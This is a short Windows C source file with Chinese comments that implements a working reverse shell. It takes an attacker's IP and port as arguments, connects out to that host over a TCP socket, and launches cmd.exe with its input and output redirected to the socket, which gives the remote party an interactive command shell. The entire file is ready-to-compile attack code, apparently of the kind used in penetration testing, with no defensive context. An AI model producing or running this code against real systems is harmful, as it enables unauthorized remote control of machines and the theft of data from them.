#include <winsock2.h>
#include <stdio.h>
#include <ws2tcpip.h> // 建議包含此標頭檔以支援較新的網路函數

#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

int main(int argc, char *argv[]) // 修改這裡以接收參數
{
    // 檢查參數數量是否正確
    if (argc < 3) {
        printf("使用方法: %s <LHOST> <LPORT>\n", argv[0]);
        printf("範例: %s 192.168.76.195 6666\n", argv[0]);
        return 1;
    }

    char *ip_addr = argv[1];   // 從第一個參數獲取 IP
    char *port = argv[2];      // 從第二個參數獲取 Port

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    // 嘗試連線
    if (WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        printf("連線失敗。\n");
        WSACleanup();
        return 1;
    }

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    // 執行 cmd.exe 並將輸入輸出重新定向到 Socket
    TCHAR cmd[] = TEXT("cmd.exe");
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return 0;
}
